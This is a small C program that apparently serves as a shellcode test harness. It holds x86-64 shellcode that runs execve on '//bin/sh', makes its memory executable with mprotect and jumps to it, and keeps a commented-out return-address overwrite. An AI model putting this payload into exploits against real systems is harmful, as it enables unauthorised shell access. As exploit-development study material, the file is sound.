#include<stdio.h>
#include<stdint.h>
#include<sys/mman.h>

char shellcode[] = "\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\x52\x50\x54\x5f"
  		   "\x52\x5e\x6a\x3b\x58\x0f\x05";

void main(){
        /*
        int *ret;
        ret = (int *)&ret + 4;
        (*ret) = (int)shellcode;
        */
        mprotect((void *)((uintptr_t)shellcode & ~4095),
                        ((uintptr_t)shellcode & 4095) + sizeof(shellcode),
                        PROT_READ | PROT_WRITE | PROT_EXEC);

       ( *(void (*)()) shellcode)() ;

        printf("NO SHELL CREATION");
}
